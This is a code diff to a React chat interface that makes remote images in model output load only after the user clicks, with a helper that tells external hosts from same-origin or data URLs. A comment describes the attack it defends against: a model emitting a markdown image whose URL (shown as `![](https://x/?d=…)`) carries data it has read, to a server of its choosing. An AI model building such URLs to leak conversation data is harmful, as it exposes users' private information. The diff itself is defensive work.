@@ -1,5 +1,5 @@
-import { useMemo, type CSSProperties, type ReactNode } from "react";
-import { Copy, Download } from "lucide-react";
+import { useMemo, useState, type CSSProperties, type ReactNode } from "react";
+import { Copy, Download, ImageIcon } from "lucide-react";
 import { Image } from "@/components/ai-elements/image";
 import { ContextMenu, ContextMenuContent, ContextMenuItem, ContextMenuTrigger } from "@/components/ui/context-menu";
 import { Dialog, DialogContent, DialogDescription, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
@@ -200,7 +200,53 @@ export function UrlFigure({
   );
 }
 
-/** The web's own picture: same frame, shown straight from where it lives. */
+/** Only ever resolved against, to tell an address that names a server from one that stays on this page's own. */
+const PAGE = new URL("http://page.invalid/");
+
+/**
+ * The server an image would be fetched from — `undefined` when showing it makes
+ * no request to anyone else: a `data:` or `blob:` picture, or a path on this
+ * page's own origin.
+ */
+export function externalHost(src: string): string | undefined {
+  const value = src.trim();
+  if (/^(?:data|blob):/i.test(value)) return undefined;
+  try {
+    const url = new URL(value, PAGE);
+    if (url.origin === PAGE.origin) return undefined;
+    return url.host === "" ? url.protocol : url.host;
+  } catch {
+    // What the URL parser rejects, the browser does not fetch either.
+    return undefined;
+  }
+}
+
+/** Pictures asked for during this visit: a remount (a folded log opening again) must not ask twice. */
+const LOADED = new Set<string>();
+
+/**
+ * The web's own picture: same frame, shown straight from where it lives — once
+ * asked for. Fetching it is a request to a server the model picked, and the
+ * address itself can carry anything the model has read (`![](https://x/?d=…)`),
+ * so nothing is requested until the reader clicks.
+ */
 export function RemoteFigure({ src, alt }: { src: string; alt: string }) {
-  return <UrlFigure src={src} alt={alt} />;
+  const host = externalHost(src);
+  const [asked, setAsked] = useState(() => LOADED.has(src));
+  if (host == null || asked) return <UrlFigure src={src} alt={alt} />;
+  return (
+    <button
+      type="button"
+      title={src}
+      aria-label={`加载外部图片：${host}`}
+      onClick={() => {
+        LOADED.add(src);
+        setAsked(true);
+      }}
+      className="my-xs inline-flex max-w-full items-center gap-xs rounded-md border border-border bg-bg-inset px-xs py-3xs text-fg-muted text-sm hover:text-fg"
+    >
+      <ImageIcon className="size-md shrink-0" />
+      <span className="truncate">{host}</span>
+    </button>
+  );
 }
